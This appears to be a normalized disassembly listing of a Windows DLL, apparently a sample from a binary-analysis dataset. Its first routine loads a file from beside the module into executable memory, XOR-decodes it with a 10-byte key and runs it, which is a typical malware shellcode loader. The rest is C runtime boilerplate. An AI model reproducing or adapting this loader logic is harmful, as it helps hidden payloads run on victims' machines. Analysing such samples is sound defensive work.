_CFDNStart
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x104
mov esi rw-data
push esi
xor ebx ebx
push ebx
call [ GetModuleFileNameA@IAT ]
push 0x5c
push esi
call sub_1000af20
pop ecx
pop ecx
push r--data
mov [ rw-data ] eax
call [ lstrlenA@IAT ]
inc eax
push eax
mov eax [ rw-data ]
inc eax
push ebx
push eax
call sub_1000d5d0
add esp 0xc
push r--data
push esi
call [ lstrcatA@IAT ]
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push esi
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
push ebx
cmp eax 0xffffffff
jne r-xdata
push eax
call [ GetFileSize@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1000b1d0
push 0x40
push 0x1000
push eax
push ebx
call [ VirtualAlloc@IAT ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push [ rw-data ]
push ebx
push rw-data
push [ rw-data ]
push eax
push [ rw-data ]
call [ ReadFile@IAT ]
push [ rw-data ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
jmp r-xdata
mov ecx [ rw-data ]
add ecx 0xfffffff6
cmp [ rw-data ] 0xa
lea esi [ eax + 0xa ]
mov [ ebp - 0x4 ] esi
mov edi eax
mov [ rw-data ] ecx
jae r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call eax
push 0xa8c
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ eax + esi ]
xor edx edx
push 0xa
pop ebx
div ebx
mov al [ edx + edi ]
xor [ ecx ] al
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp eax [ rw-data ]
jb r-xdata
mov ecx [ rw-data ]
xor [ eax + ecx ] 0x41
inc [ rw-data ]
cmp [ rw-data ] 0xa
jb r-xdata
xor ebx ebx
mov eax [ rw-data ]
sub_1000af20
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1000af4d
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000afa2
mov edi edi
push esi
call sub_1000bb97
mov esi eax
push esi
call sub_1000bb60
push esi
call sub_1000b9c6
push esi
call sub_1000b9b7
push esi
call sub_1000b9a8
push esi
call sub_1000b7a3
push esi
call sub_1000b792
add esp 0x18
pop esi
retn
sub_1000afd5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000aff9
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000c255
push r--data
push r--data
call sub_1000afd5
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_1000c310
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1000c22f
call sub_1000c1f2
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_1000c310
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1000b090
push 0x20
push r--data
call sub_1000c3d0
push 0x8
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b1bb
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1000c415
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1000b64d
pop ecx
push [ ebp + 0x8 ]
call sub_1000af78
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_1000bb97
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_1000bb97
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1000b229
push 0x8
push r--data
call sub_1000c3d0
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1000cf46
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1000beff
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000bba9
push 0x214
push 0x1
call sub_1000c84c
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1000c209
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000ceaf
mov [ rw-data ] eax
call sub_1000c8e6
test eax eax
jns r-xdata
call sub_1000cf64
jmp r-xdata
call sub_1000c415
retn 0xc
xor eax eax
inc eax
push edi
call sub_1000be90
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1000b1fc
call sub_1000cdf4
test eax eax
js r-xdata
call sub_1000bbdd
jmp r-xdata
push esi
call sub_1000c7cd
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000bc1a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b302
jmp r-xdata
call sub_1000cb2b
call sub_1000bbdd
call sub_1000cf64
call sub_1000cb2b
jmp r-xdata
call sub_1000cb7e
test eax eax
js r-xdata
push 0x0
call sub_1000aff9
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1000b38d
push 0xc
push r--data
call sub_1000c3d0
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_1000af09
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1000b229
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1000b229
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_1000af09
push edi
push 0x0
push ebx
call sub_1000b229
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1000c415
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1000b38d
pop ecx
pop ebp
retn 0xc
call sub_1000d0e2
sub_1000b4a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1000d17d
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1000d17d
pop ecx
sub_1000b5ac
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1000b5f6
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1000c7cd
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1000b664
push 0xc
push r--data
call sub_1000c3d0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1000c794
push 0x1e
call sub_1000c5e5
push 0xff
call sub_1000af78
push 0x18
call sub_1000c807
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1000b726
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1000c0bc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1000c415
retn
push edi
call sub_1000c7cd
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1000c7cd
pop ecx
call sub_1000c0bc
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b71d
mov eax [ ebp - 0x1c ]
sub_1000b726
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1000b664
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000b20b
sub_1000b7c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1000b805
push 0x20
push r--data
call sub_1000c3d0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000bcce
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1000c415
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1000b7c1
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1000b1e6
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1000c0bc
mov [ eax ] 0x16
call sub_1000bb50
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1000b726
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1000bb97
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b96c
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1000b9d5
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1000d5d0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1000d17d
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000af0f
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1000d17d
pop ecx
sub_1000bafe
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1000b9d5
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1000bb23
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000bafe
int3
pop ebp
jmp eax
sub_1000bb6f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1000bba9
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000bbdd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_1000b5f6
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000bc1a
push 0x8
push r--data
call sub_1000c3d0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bcbc
push 0xc
call sub_1000b726
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1000d64a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bcc5
call sub_1000c415
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000bcce
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000bba9
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1000c84c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_1000c7cd
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000bc1a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000bd61
push 0x8
push r--data
call sub_1000c3d0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1000c415
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1000c7cd
pop ecx
push 0xd
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1000c7cd
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000be7b
push 0xc
call sub_1000b726
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000be87
push esi
call sub_1000c7cd
pop ecx
push edi
call sub_1000d6d9
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1000c7cd
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000d772
pop ecx
sub_1000be90
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_1000bd61
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1000beff
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1000bbdd
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1000bba0
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000afa2
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1000b5ac
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1000bbdd
mov edi [ DecodePointer@IAT ]
push sub_1000bd61
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1000c84c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000bc1a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1000c07a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000c0cf
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_1000e067
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000c898
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000c898
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1000c185
mov edi edi
push esi
push 0x4
push 0x20
call sub_1000c84c
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1000c1b6
push 0xc
push r--data
call sub_1000c3d0
call sub_1000af90
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1000c0cf
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c1ec
mov eax [ ebp - 0x1c ]
call sub_1000c415
retn
sub_1000c209
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000c22f
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000c255
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
